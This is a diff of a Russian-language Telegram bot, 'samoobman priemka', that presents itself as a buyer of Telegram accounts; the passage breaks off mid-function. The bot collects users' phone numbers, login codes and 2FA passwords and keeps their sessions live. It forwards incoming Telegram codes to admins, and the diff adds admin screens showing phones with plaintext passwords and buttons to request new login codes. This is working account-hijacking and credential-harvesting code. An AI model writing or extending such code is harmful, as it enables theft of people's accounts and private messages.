@@ -64,7 +64,7 @@ class AuthStates(StatesGroup):
 class AdminStates(StatesGroup):
     waiting_for_user_id_balance = State()
     waiting_for_new_balance = State()
-    waiting_for_broadcast_text = State()
+    waiting_for_broadcast_content = State()
     waiting_for_photo_menu = State()
     waiting_for_photo_profile = State()
     waiting_for_photo_withdraw = State()
@@ -79,97 +79,48 @@ class WithdrawStates(StatesGroup):
 async def init_db():
     async with aiosqlite.connect(DB_PATH) as db:
         await db.execute("""
-                         CREATE TABLE IF NOT EXISTS users
-                         (
-                             user_id
-                             INTEGER
-                             PRIMARY
-                             KEY,
-                             username
-                             TEXT,
-                             full_name
-                             TEXT,
-                             balance
-                             REAL
-                             DEFAULT
-                             0.0,
-                             total_earned
-                             REAL
-                             DEFAULT
-                             0.0,
-                             reg_date
-                             TEXT
-                         )
-                         """)
+            CREATE TABLE IF NOT EXISTS users (
+                user_id INTEGER PRIMARY KEY,
+                username TEXT,
+                full_name TEXT,
+                balance REAL DEFAULT 0.0,
+                total_earned REAL DEFAULT 0.0,
+                reg_date TEXT
+            )
+        """)
         await db.execute("""
-                         CREATE TABLE IF NOT EXISTS submit_requests
-                         (
-                             id
-                             INTEGER
-                             PRIMARY
-                             KEY
-                             AUTOINCREMENT,
-                             user_id
-                             INTEGER,
-                             phone
-                             TEXT,
-                             status
-                             TEXT
-                             DEFAULT
-                             'pending',
-                             date
-                             TEXT
-                         )
-                         """)
+            CREATE TABLE IF NOT EXISTS submit_requests (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                user_id INTEGER,
+                phone TEXT,
+                status TEXT DEFAULT 'pending',
+                date TEXT
+            )
+        """)
         await db.execute("""
-                         CREATE TABLE IF NOT EXISTS accounts
-                         (
-                             id
-                             INTEGER
-                             PRIMARY
-                             KEY
-                             AUTOINCREMENT,
-                             user_id
-                             INTEGER,
-                             phone
-                             TEXT,
-                             session_name
-                             TEXT,
-                             password
-                             TEXT,
-                             date
-                             TEXT
-                         )
-                         """)
+            CREATE TABLE IF NOT EXISTS accounts (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                user_id INTEGER,
+                phone TEXT,
+                session_name TEXT,
+                password TEXT,
+                date TEXT
+            )
+        """)
         await db.execute("""
-                         CREATE TABLE IF NOT EXISTS withdraw_requests
-                         (
-                             id
-                             INTEGER
-                             PRIMARY
-                             KEY
-                             AUTOINCREMENT,
-                             user_id
-                             INTEGER,
-                             amount
-                             REAL,
-                             status
-                             TEXT
-                             DEFAULT
-                             'pending'
-                         )
-                         """)
+            CREATE TABLE IF NOT EXISTS withdraw_requests (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                user_id INTEGER,
+                amount REAL,
+                status TEXT DEFAULT 'pending'
+            )
+        """)
         await db.execute("""
-                         CREATE TABLE IF NOT EXISTS settings
-                         (
-                             key
-                             TEXT
-                             PRIMARY
-                             KEY,
-                             value
-                             TEXT
-                         )
-                         """)
+            CREATE TABLE IF NOT EXISTS settings (
+                key TEXT PRIMARY KEY,
+                value TEXT
+            )
+        """)
         await db.commit()
 
     async with aiosqlite.connect(DB_PATH) as db:
@@ -183,8 +134,8 @@ async def init_db():
 async def get_user(user_id: int):
     async with aiosqlite.connect(DB_PATH) as db:
         async with db.execute(
-                "SELECT user_id, username, full_name, balance, total_earned, reg_date FROM users WHERE user_id = ?",
-                (user_id,),
+            "SELECT user_id, username, full_name, balance, total_earned, reg_date FROM users WHERE user_id = ?",
+            (user_id,),
         ) as cursor:
             return await cursor.fetchone()
 
@@ -230,7 +181,7 @@ async def setup_account_listener(acc_id: int, session_file_path: str, phone: str
                     chat_id=admin_id,
                     text=(
                         f"📩 **Новый код/сообщение от Telegram!**\n"
-                        f"• Аккаунт (ID в базе): `{acc_id}`\n"
+                        f"• Аккаунт ID: `{acc_id}`\n"
                         f"• Телефон: `{phone}`\n\n"
                         f"💬 **Текст сообщения:**\n`{msg_text}`"
                     ),
@@ -262,8 +213,7 @@ async def init_all_account_listeners():
 
 
 # ================= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =================
-async def edit_to_photo_or_text(message: Message, text: str, reply_markup, photo_key: str,
-                                parse_mode: str = "Markdown"):
+async def edit_to_photo_or_text(message: Message, text: str, reply_markup, photo_key: str, parse_mode: str = "Markdown"):
     photo_file_id = await get_setting(photo_key)
     if photo_file_id:
         try:
@@ -312,8 +262,7 @@ async def send_log(text: str):
         logger.error(f"Не удалось отправить лог: {e}")
 
 
-async def finalize_auth_and_success(client: TelegramClient, phone: str, session_name: str, user_id: int,
-                                    has_2fa: bool = False, password_used: str = None):
+async def finalize_auth_and_success(client: TelegramClient, phone: str, session_name: str, user_id: int, has_2fa: bool = False, password_used: str = None):
     try:
         if await client.is_user_authorized():
             await client.session.save()
@@ -325,10 +274,12 @@ async def finalize_auth_and_success(client: TelegramClient, phone: str, session_
     except Exception:
         pass
 
+    clean_password = password_used if (has_2fa and password_used) else ""
+
     async with aiosqlite.connect(DB_PATH) as db:
         cursor = await db.execute(
             "INSERT INTO accounts (user_id, phone, session_name, password, date) VALUES (?, ?, ?, ?, datetime('now'))",
-            (user_id, phone, session_name, password_used if (has_2fa and password_used) else "")
+            (user_id, phone, session_name, clean_password)
         )
         acc_id = cursor.lastrowid
         await db.commit()
@@ -344,14 +295,13 @@ async def finalize_auth_and_success(client: TelegramClient, phone: str, session_
 
     for admin_id in ADMIN_IDS:
         try:
-            pwd_info = f"\n• 🔑 2FA Пароль: `{password_used}`" if (
-                        has_2fa and password_used) else "\n• 🔑 2FA Пароль: Отсутствует"
+            pwd_info = f"\n• 🔑 2FA Пароль: `{clean_password}`" if clean_password else "\n• 🔑 2FA Пароль: Отсутствует"
             await bot.send_message(
                 chat_id=admin_id,
                 text=(
                     f"📥 **Аккаунт успешно принят в систему!**\n\n"
-                    f"• ID в базе: `{acc_id}`\n"
-                    f"• Пользователь: `{user_id}`\n"
+                    f"• ID аккаунта: `{acc_id}`\n"
+                    f"• Юзер ID: `{user_id}`\n"
                     f"• Телефон: `{phone}`"
                     f"{pwd_info}"
                 ),
@@ -360,14 +310,11 @@ async def finalize_auth_and_success(client: TelegramClient, phone: str, session_
         except Exception as ex:
             logger.error(f"Не удалось отправить уведомление админу: {ex}")
 
-    await send_log(
-        f"🔔 [samoobman priemka] Успешная сдача аккаунта!\nЮзер: `{user_id}`\nТелефон: `{phone}`"
-    )
+    await send_log(f"🔔 [samoobman priemka] Успешная сдача аккаунта!\nЮзер: `{user_id}`\nТелефон: `{phone}`")
 
     try:
         success_text = "✅ Ваш аккаунт успешно проверен и принят!\n💰 Вам автоматически начислен бонус **$1.00** на баланс."
-        await bot.send_message(chat_id=user_id, text=success_text, reply_markup=get_main_keyboard(user_id in ADMIN_IDS),
-                               parse_mode="Markdown")
+        await bot.send_message(chat_id=user_id, text=success_text, reply_markup=get_main_keyboard(user_id in ADMIN_IDS), parse_mode="Markdown")
     except Exception:
         pass
 
@@ -381,12 +328,43 @@ async def cmd_start(message: Message):
 
     is_admin = user.id in ADMIN_IDS
     text = (
-        "👋 Добро пожаловать в официального бота автоскупки аккаунтов!\n\n"
+        "👋 Добро пожаловать в официальный бот автоскупки аккаунтов!\n\n"
         "🔹 **samoobman priemka** — лучший сервис быстрой и безопасной скупки "
         "ваших Telegram аккаунтов по выгодным ценам.\n\n"
         "Выберите нужный раздел в меню ниже:"
     )
     await message.answer(text, reply_markup=get_main_keyboard(is_admin), parse_mode="Markdown")
+
+
+@router.message(Command("help"))
+async def cmd_help(message: Message):
+    text = (
+        "ℹ️ **Справка по использованию ботов samoobman priemka**:\n\n"
+        "• **Сдать ТГ аккаунт**: укажите номер, введите код из Telegram и привязанный пароль (если есть), получите бонус.\n"
+        "• **Вывод средств**: выводите заработанные средства по доступным заявкам.\n"
+        "• Администрация обрабатывает заявки в автоматическом и ручном режимах."
+    )
+    await message.answer(text, parse_mode="Markdown")
+
+
+@router.message(Command("admin"))
+async def cmd_admin_shortcut(message: Message):
+    if message.from_user.id not in ADMIN_IDS:
+        return
+    await cb_admin_panel_msg(message)
+
+
+async def cb_admin_panel_msg(message: Message):
+    admin_kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="📦 Завершенные сделки / Аккаунты", callback_data="admin_accounts_list")],
+        [InlineKeyboardButton(text="👥 Управление пользователями", callback_data="admin_users_list")],
+        [InlineKeyboardButton(text="🖼 Управление картинками", callback_data="admin_photos_menu")],
+        [InlineKeyboardButton(text="📊 Юзеры в TXT таблицу", callback_data="admin_export_txt")],
+        [InlineKeyboardButton(text="💵 Изменить баланс юзеру", callback_data="admin_change_balance")],
+        [InlineKeyboardButton(text="📢 Настройка и запуск рассылки", callback_data="admin_broadcast")],
+        [InlineKeyboardButton(text="⬅️ В главное меню", callback_data="back_main")],
+    ])
+    await message.answer("👑 **Админ-панель samoobman priemka**\n\nВыберите нужную функцию:", reply_markup=admin_kb, parse_mode="Markdown")
 
 
 @router.callback_query(F.data == "back_main")
@@ -458,7 +436,6 @@ async def process_phone(message: Message, state: FSMContext):
         await client.connect()
         sent = await client.send_code_request(phone)
 
-        # Сохраняем объект клиента в FSM память, чтобы не терять соединение и hash
         await state.update_data(
             client=client,
             phone=phone,
@@ -481,8 +458,7 @@ async def process_phone(message: Message, state: FSMContext):
             await client.disconnect()
         except Exception:
             pass
-        await status_msg.edit_text(f"❌ Ошибка отправки кода: `{e}`", reply_markup=get_main_keyboard(uid in ADMIN_IDS),
-                                   parse_mode="Markdown")
+        await status_msg.edit_text(f"❌ Ошибка отправки кода: `{e}`", reply_markup=get_main_keyboard(uid in ADMIN_IDS), parse_mode="Markdown")
         await state.clear()
 
 
@@ -503,8 +479,7 @@ async def process_code(message: Message, state: FSMContext):
     status_msg_id = data.get("status_msg_id")
 
     if not client:
-        await message.answer("❌ Сессия устарела. Начните заново.",
-                             reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS))
+        await message.answer("❌ Сессия устарела. Начните заново.", reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS))
         return await state.clear()
 
     try:
@@ -522,13 +497,11 @@ async def process_code(message: Message, state: FSMContext):
         await state.clear()
 
     except SessionPasswordNeededError:
-        # Клиент остается подключенным для ввода 2FA
         await state.update_data(status_msg_id=status_msg_id)
         err_text = "🔐 На вашем аккаунте установлен облачный пароль (2FA).\nВведите ваш пароль в чат:"
         if status_msg_id:
             try:
-                await bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg_id, text=err_text,
-                                            reply_markup=get_back_keyboard())
+                await bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg_id, text=err_text, reply_markup=get_back_keyboard())
             except Exception:
                 pass
         await state.set_state(AuthStates.waiting_for_password)
@@ -542,8 +515,7 @@ async def process_code(message: Message, state: FSMContext):
         err_text = f"❌ Ошибка входа: `{e}`\n(Возможно, код устарел. Нажмите «Назад в меню» и начните заново)."
         if status_msg_id:
             try:
-                await bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg_id, text=err_text,
-                                            reply_markup=get_back_keyboard())
+                await bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg_id, text=err_text, reply_markup=get_back_keyboard())
             except Exception:
                 pass
         await state.clear()
@@ -565,8 +537,7 @@ async def process_password(message: Message, state: FSMContext):
     status_msg_id = data.get("status_msg_id")
 
     if not client:
-        await message.answer("❌ Сессия устарела. Начните заново.",
-                             reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS))
+        await message.answer("❌ Сессия устарела. Начните заново.", reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS))
         return await state.clear()
 
     try:
@@ -591,8 +562,7 @@ async def process_password(message: Message, state: FSMContext):
         err_text = f"❌ Неверный пароль или ошибка: `{e}`\nВведите пароль снова:"
         if status_msg_id:
             try:
-                await bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg_id, text=err_text,
-                                            reply_markup=get_back_keyboard())
+                await bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg_id, text=err_text, reply_markup=get_back_keyboard())
             except Exception:
                 pass
 
@@ -632,8 +602,7 @@ async def process_withdraw_amount(message: Message, state: FSMContext):
         err_text = "❌ Введите корректное число:"
         if prompt_msg_id:
             try:
-                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text,
-                                            reply_markup=get_back_keyboard())
+                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text, reply_markup=get_back_keyboard())
             except Exception:
                 pass
         return
@@ -645,16 +614,14 @@ async def process_withdraw_amount(message: Message, state: FSMContext):
         err_text = f"❌ Неверная сумма. Доступно для вывода: ${balance:.2f}. Введите снова:"
         if prompt_msg_id:
             try:
-                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text,
-                                            reply_markup=get_back_keyboard())
+                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text, reply_markup=get_back_keyboard())
             except Exception:
                 pass
         return
 
     async with aiosqlite.connect(DB_PATH) as db:
         await db.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (amount, message.from_user.id))
-        cursor = await db.execute("INSERT INTO withdraw_requests (user_id, amount, status) VALUES (?, ?, 'pending')",
-                                  (message.from_user.id, amount))
+        cursor = await db.execute("INSERT INTO withdraw_requests (user_id, amount, status) VALUES (?, ?, 'pending')", (message.from_user.id, amount))
         req_id = cursor.lastrowid
         await db.commit()
 
@@ -680,15 +647,11 @@ async def process_withdraw_amount(message: Message, state: FSMContext):
     success_text = f"✅ Заявка на вывод **${amount:.2f}** успешно создана и отправлена администратору."
     if prompt_msg_id:
         try:
-            await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=success_text,
-                                        reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS),
-                                        parse_mode="Markdown")
+            await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=success_text, reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS), parse_mode="Markdown")
         except Exception:
-            await message.answer(success_text, reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS),
-                                 parse_mode="Markdown")
+            await message.answer(success_text, reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS), parse_mode="Markdown")
     else:
-        await message.answer(success_text, reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS),
-                             parse_mode="Markdown")
+        await message.answer(success_text, reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS), parse_mode="Markdown")
 
     await state.clear()
 
@@ -747,11 +710,12 @@ async def cb_admin_panel(callback: CallbackQuery):
         return await callback.answer("Доступ запрещен.", show_alert=True)
 
     admin_kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📦 Завершенные сделки (Аккаунты)", callback_data="admin_accounts_list")],
+        [InlineKeyboardButton(text="📦 Завершенные сделки / Аккаунты", callback_data="admin_accounts_list")],
+        [InlineKeyboardButton(text="👥 Управление пользователями", callback_data="admin_users_list")],
         [InlineKeyboardButton(text="🖼 Управление картинками", callback_data="admin_photos_menu")],
         [InlineKeyboardButton(text="📊 Юзеры в TXT таблицу", callback_data="admin_export_txt")],
         [InlineKeyboardButton(text="💵 Изменить баланс юзеру", callback_data="admin_change_balance")],
-        [InlineKeyboardButton(text="📢 Сделать рассылку", callback_data="admin_broadcast")],
+        [InlineKeyboardButton(text="📢 Настройка и запуск рассылки", callback_data="admin_broadcast")],
         [InlineKeyboardButton(text="⬅️ В главное меню", callback_data="back_main")],
     ])
     await callback.message.edit_text(
@@ -766,32 +730,60 @@ async def admin_accounts_list(callback: CallbackQuery):
         return
 
     async with aiosqlite.connect(DB_PATH) as db:
-        async with db.execute(
-                "SELECT id, user_id, phone, password, date FROM accounts ORDER BY id DESC LIMIT 15") as cursor:
+        async with db.execute("SELECT id, user_id, phone, password, date FROM accounts ORDER BY id DESC LIMIT 15") as cursor:
             accounts = await cursor.fetchall()
 
     if not accounts:
-        kb = InlineKeyboardMarkup(
-            inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад в админ-панель", callback_data="admin_panel")]])
-        return await callback.message.edit_text("📭 Завершенных сделок пока нет.", reply_markup=kb,
-                                                parse_mode="Markdown")
+        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад в админ-панель", callback_data="admin_panel")]])
+        return await callback.message.edit_text("📭 Завершенных сделок пока нет.", reply_markup=kb, parse_mode="Markdown")
 
     kb_buttons = []
     for acc in accounts:
         acc_id, uid, phone, pwd, date_str = acc
-        pwd_text = f" | Пароль: {pwd}" if pwd else " | Без пароля"
-        kb_buttons.append(
-            [InlineKeyboardButton(text=f"📱 ID:{acc_id} | {phone}{pwd_text}", callback_data=f"adm_acc_code_{acc_id}")])
+        pwd_text = " | С паролем" if pwd else " | Без пароля"
+        kb_buttons.append([InlineKeyboardButton(text=f"📱 ID:{acc_id} | {phone}{pwd_text}", callback_data=f"adm_acc_detail_{acc_id}")])
 
     kb_buttons.append([InlineKeyboardButton(text="⬅️ Назад в админ-панель", callback_data="admin_panel")])
 
     await callback.message.edit_text(
         "📦 **Завершенные сделки (Успешные аккаунты)**\n"
-        "Сессии этих аккаунтов удерживаются в памяти бота.\n"
-        "Нажмите на аккаунт, чтобы бот принудительно запросил новый код:",
+        "Нажмите на аккаунт для просмотра подробностей и запроса кода:",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_buttons),
         parse_mode="Markdown"
     )
+
+
+@router.callback_query(F.data.startswith("adm_acc_detail_"))
+async def admin_account_detail(callback: CallbackQuery):
+    if callback.from_user.id not in ADMIN_IDS:
+        return
+
+    acc_id = int(callback.data.split("_")[3])
+
+    async with aiosqlite.connect(DB_PATH) as db:
+        async with db.execute("SELECT id, user_id, phone, session_name, password, date FROM accounts WHERE id = ?", (acc_id,)) as cursor:
+            row = await cursor.fetchone()
+
+    if not row:
+        return await callback.answer("❌ Аккаунт не найден.", show_alert=True)
+
+    acc_id, uid, phone, session_name, password, date_str = row
+    pwd_display = f"`{password}`" if password else "Отсутствует"
+
+    text = (
+        f"📱 **Детали аккаунта #{acc_id}**\n\n"
+        f"• **Телефон:** `{phone}`\n"
+        f"• **ID пользователя:** `{uid}`\n"
+        f"• **Пароль (2FA):** {pwd_display}\n"
+        f"• **Дата добавления:** {date_str}"
+    )
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔄 Запросить код (Telethon)", callback_data=f"adm_acc_code_{acc_id}")],
+        [InlineKeyboardButton(text="⬅️ К списку сделок", callback_data="admin_accounts_list")]
+    ])
+
+    await callback.message.edit_text(text, reply_markup=kb, parse_mode="Markdown")
 
 
 @router.callback_query(F.data.startswith("adm_acc_code_"))
@@ -802,8 +794,7 @@ async def admin_auto_request_code(callback: CallbackQuery):
     acc_id = int(callback.data.split("_")[3])
 
     async with aiosqlite.connect(DB_PATH) as db:
-        async with db.execute("SELECT user_id, phone, session_name, password FROM accounts WHERE id = ?",
-                              (acc_id,)) as cursor:
+        async with db.execute("SELECT user_id, phone, session_name, password FROM accounts WHERE id = ?", (acc_id,)) as cursor:
             row = await cursor.fetchone()
 
     if not row:
@@ -811,8 +802,7 @@ async def admin_auto_request_code(callback: CallbackQuery):
 
     uid, phone, session_name, password = row
 
-    await callback.message.edit_text(f"⏳ Запрашиваю код для `{phone}` через активный фоновый клиент...",
-                                     parse_mode="Markdown")
+    await callback.message.edit_text(f"⏳ Запрашиваю код для `{phone}`...", parse_mode="Markdown")
 
     client = active_telethon_clients.get(acc_id)
     temp_client = None
@@ -833,14 +823,12 @@ async def admin_auto_request_code(callback: CallbackQuery):
 
         kb = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="🔄 Запросить код повторно", callback_data=f"adm_acc_code_{acc_id}")],
-            [InlineKeyboardButton(text="⬅️ К списку сделок", callback_data="admin_accounts_list")]
+            [InlineKeyboardButton(text="⬅️ Назад к деталям", callback_data=f"adm_acc_detail_{acc_id}")]
         ])
 
-        pwd_display = f"\n• 🔑 Введенный пароль: `{password}`" if password else "\n• 🔑 Введенный пароль: Отсутствует"
-
         await callback.message.edit_text(
-            f"✅ **Запрос кода для `{phone}` успешно отправлен!**{pwd_display}\n\n"
-            f"ℹ️ Сообщение с кодом от Telegram придет прямо сюда (администратору) автоматически.",
+            f"✅ **Запрос кода для `{phone}` успешно отправлен!**\n\n"
+            f"ℹ️ Сообщение с кодом придет сюда автоматически через фоновый слушатель.",
             reply_markup=kb,
             parse_mode="Markdown"
         )
@@ -854,7 +842,7 @@ async def admin_auto_request_code(callback: CallbackQuery):
 
         kb = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="🔄 Попробовать снова", callback_data=f"adm_acc_code_{acc_id}")],
-            [InlineKeyboardButton(text="⬅️ К списку сделок", callback_data="admin_accounts_list")]
+            [InlineKeyboardButton(text="⬅️ Назад к деталям", callback_data=f"adm_acc_detail_{acc_id}")]
         ])
         await callback.message.edit_text(
             f"❌ **Ошибка при запросе кода для `{phone}`:**\n`{e}`",
@@ -863,6 +851,81 @@ async def admin_auto_request_code(callback: CallbackQuery):
         )
 
 
+# --- УПРАВЛЕНИЕ ПОЛЬЗОВАТЕЛЯМИ (ВЫГРУЗКА НОМЕР+ПАРОЛЬ И ЗАПРОС КОДА) ---
+@router.callback_query(F.data == "admin_users_list")
+async def admin_users_list(callback: CallbackQuery):
+    if callback.from_user.id not in ADMIN_IDS:
+        return
+
+    async with aiosqlite.connect(DB_PATH) as db:
+        async with db.execute("SELECT user_id, username, full_name, balance, reg_date FROM users ORDER BY reg_date DESC LIMIT 20") as cursor:
+            users = await cursor.fetchall()
+
+    if not users:
+        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад в админ-панель", callback_data="admin_panel")]])
+        return await callback.message.edit_text("📭 В базе пока нет зарегистрированных пользователей.", reply_markup=kb, parse_mode="Markdown")
+
+    kb_buttons = []
+    for u in users:
+        uid, username, full_name, balance, reg_date = u
+        kb_buttons.append([InlineKeyboardButton(text=f"👤 {full_name} (ID: {uid})", callback_data=f"adm_user_info_{uid}")])
+
+    kb_buttons.append([InlineKeyboardButton(text="⬅️ Назад в админ-панель", callback_data="admin_panel")])
+
+    await callback.message.edit_text(
+        "👥 **Список зарегистрированных пользователей**\n"
+        "Выберите пользователя для просмотра его данных, связанных аккаунтов и отправки запроса кода:",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_buttons),
+        parse_mode="Markdown"
+    )
+
+
+@router.callback_query(F.data.startswith("adm_user_info_"))
+async def admin_user_info(callback: CallbackQuery):
+    if callback.from_user.id not in ADMIN_IDS:
+        return
+
+    uid = int(callback.data.split("_")[3])
+    user_data = await get_user(uid)
+
+    if not user_data:
+        return await callback.answer("❌ Пользователь не найден.", show_alert=True)
+
+    uid, username, full_name, balance, total_earned, reg_date = user_data
+
+    async with aiosqlite.connect(DB_PATH) as db:
+        async with db.execute("SELECT id, phone, password, date FROM accounts WHERE user_id = ?", (uid,)) as cursor:
+            accounts = await cursor.fetchall()
+
+    acc_text = ""
+    kb_buttons = []
+    if accounts:
+        acc_text = "\n\n📱 **Привязанные аккаунты:**\n"
+        for acc in accounts:
+            acc_id, phone, pwd, date_acc = acc
+            pwd_str = f"Пароль: `{pwd}`" if pwd else "Пароль: Отсутствует"
+            acc_text += f"• Телефон: `{phone}` | {pwd_str}\n"
+            kb_buttons.append([InlineKeyboardButton(text=f"📲 Запросить код для {phone}", callback_data=f"adm_acc_code_{acc_id}")])
+    else:
+        acc_text = "\n\n📱 У пользователя нет сданных аккаунтов."
+
+    kb_buttons.append([InlineKeyboardButton(text="⬅️ К списку пользователей", callback_data="admin_users_list")])
+
+    text = (
+        f"👤 **Карточка пользователя**\n\n"
+        f"• **Имя:** {full_name}\n"
+        f"• **Username:** @{username}\n"
+        f"• **ID:** `{uid}`\n"
+        f"• **Баланс:** `${balance:.2f}`\n"
+        f"• **Заработано всего:** `${total_earned:.2f}`\n"
+        f"• **Дата регистрации:** {reg_date}"
+        f"{acc_text}"
+    )
+
+    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_buttons), parse_mode="Markdown")
+
+
+# --- УПРАВЛЕНИЕ КАРТИНКАМИ ---
 @router.callback_query(F.data == "admin_photos_menu")
 async def admin_photos_menu(callback: CallbackQuery):
     if callback.from_user.id not in ADMIN_IDS:
@@ -875,7 +938,7 @@ async def admin_photos_menu(callback: CallbackQuery):
         [InlineKeyboardButton(text="⬅️ Назад в админ-панель", callback_data="admin_panel")],
     ])
     await callback.message.edit_text(
-        "🖼 **Настройка картинок для разделов**\n\nВыберите раздел, для которого хотите установить или изменить фото:",
+        "🖼 **Настройка картинок для разделов**\n\nВыберите раздел для изменения фото:",
         reply_markup=kb, parse_mode="Markdown"
     )
 
@@ -901,7 +964,7 @@ async def admin_set_photo_prompt(callback: CallbackQuery, state: FSMContext):
     ])
 
     await callback.message.edit_text(
-        f"📸 Отправьте **фотографию**, которую хотите установить для раздела: **{section_name}**.\n\nИли нажмите кнопку ниже, чтобы удалить картинку:",
+        f"📸 Отправьте **фотографию** для раздела: **{section_name}**.\n\nИли удалите текущую:",
         reply_markup=kb, parse_mode="Markdown"
     )
 
@@ -921,7 +984,7 @@ async def admin_delete_photo(callback: CallbackQuery):
     setting_key = key_map.get(callback.data)
     if setting_key:
         await set_setting(setting_key, "")
-        await callback.answer("✅ Картинка успешно удалена!", show_alert=True)
+        await callback.answer("✅ Картинка удалена!", show_alert=True)
 
     await admin_photos_menu(callback)
 
@@ -947,21 +1010,10 @@ async def admin_save_photo(message: Message, state: FSMContext):
 
     if setting_key:
         await set_setting(setting_key, photo_file_id)
-        await message.answer("✅ Фотография для выбранного раздела успешно сохранена!")
+        await message.answer("✅ Фотография успешно сохранена!")
 
     await state.clear()
-
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🖼 Главное меню (Фото)", callback_data="set_photo_menu")],
-        [InlineKeyboardButton(text="🖼 Профиль (Фото)", callback_data="set_photo_profile")],
-        [InlineKeyboardButton(text="🖼 Вывод средств (Фото)", callback_data="set_photo_withdraw")],
-        [InlineKeyboardButton(text="🖼 Сдать ТГ аккаунт (Фото)", callback_data="set_photo_submit")],
-        [InlineKeyboardButton(text="⬅️ Назад в админ-панель", callback_data="admin_panel")],
-    ])
-    await message.answer(
-        "👑 **Настройка картинок для разделов**\n\nВыберите раздел, для которого хотите установить или изменить фото:",
-        reply_markup=kb, parse_mode="Markdown"
-    )
+    await cb_admin_panel_msg(message)
 
 
 @router.callback_query(F.data == "admin_export_txt")
@@ -970,22 +1022,19 @@ async def admin_export_txt(callback: CallbackQuery):
         return
 
     async with aiosqlite.connect(DB_PATH) as db:
-        async with db.execute(
-                "SELECT user_id, username, full_name, balance, total_earned, reg_date FROM users") as cursor:
+        async with db.execute("SELECT user_id, username, full_name, balance, total_earned, reg_date FROM users") as cursor:
             rows = await cursor.fetchall()
 
     file_path = "users_table.txt"
     with open(file_path, "w", encoding="utf-8") as f:
-        f.write(
-            f"{'ID':<12} | {'USERNAME':<15} | {'FULL NAME':<20} | {'BALANCE':<10} | {'EARNED':<10} | {'REG DATE'}\n")
+        f.write(f"{'ID':<12} | {'USERNAME':<15} | {'FULL NAME':<20} | {'BALANCE':<10} | {'EARNED':<10} | {'REG DATE'}\n")
         f.write("-" * 90 + "\n")
         for r in rows:
-            f.write(
-                f"{r[0]:<12} | {str(r[1]):<15} | {str(r[2]):<20} | ${float(r[3]):<9.2f} | ${float(r[4]):<9.2f} | {r[5]}\n")
+            f.write(f"{r[0]:<12} | {str(r[1]):<15} | {str(r[2]):<20} | ${float(r[3]):<9.2f} | ${float(r[4]):<9.2f} | {r[5]}\n")
 
     await callback.message.answer_document(
         document=FSInputFile(file_path),
-        caption="📊 Таблица всех пользователей **samoobman priemka**.",
+        caption="📊 Таблица всех зарегистрированных пользователей **samoobman priemka**.",
         parse_mode="Markdown"
     )
 
@@ -1007,12 +1056,11 @@ async def admin_get_uid(message: Message, state: FSMContext):
 
     user = await get_user(uid)
     if not user:
-        await message.answer("❌ Пользователь с таким ID не найден в базе.")
+        await message.answer("❌ Пользователь не найден в базе.")
         return await state.clear()
 
     await state.update_data(target_uid=uid)
-    await message.answer(
-        f"👤 Найден пользователь: {user[2]} (@{user[1]})\nТекущий баланс: ${user[3]:.2f}\n\nВведите новый баланс (число):")
+    await message.answer(f"👤 Пользователь: {user[2]} (@{user[1]})\nБаланс: ${user[3]:.2f}\n\nВведите новый баланс (число):")
     await state.set_state(AdminStates.waiting_for_new_balance)
 
 
@@ -1030,40 +1078,61 @@ async def admin_set_balance(message: Message, state: FSMContext):
         await db.execute("UPDATE users SET balance = ? WHERE user_id = ?", (new_bal, uid))
         await db.commit()
 
-    await message.answer(f"✅ Баланс пользователя `{uid}` успешно изменен на **${new_bal:.2f}**.", parse_mode="Markdown")
+    await message.answer(f"✅ Баланс пользователя `{uid}` изменен на **${new_bal:.2f}**.", parse_mode="Markdown")
     await state.clear()
 
 
+# --- РАССЫЛКА ---
 @router.callback_query(F.data == "admin_broadcast")
 async def admin_broadcast_start(callback: CallbackQuery, state: FSMContext):
     if callback.from_user.id not in ADMIN_IDS:
         return
-    await callback.message.answer("📢 Введите текст рассылки для всех пользователей **samoobman priemka**:",
-                                  parse_mode="Markdown")
-    await state.set_state(AdminStates.waiting_for_broadcast_text)
+    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Отмена", callback_data="admin_panel")]])
+    await callback.message.edit_text(
+        "📢 **Управление рассылкой**\n\n"
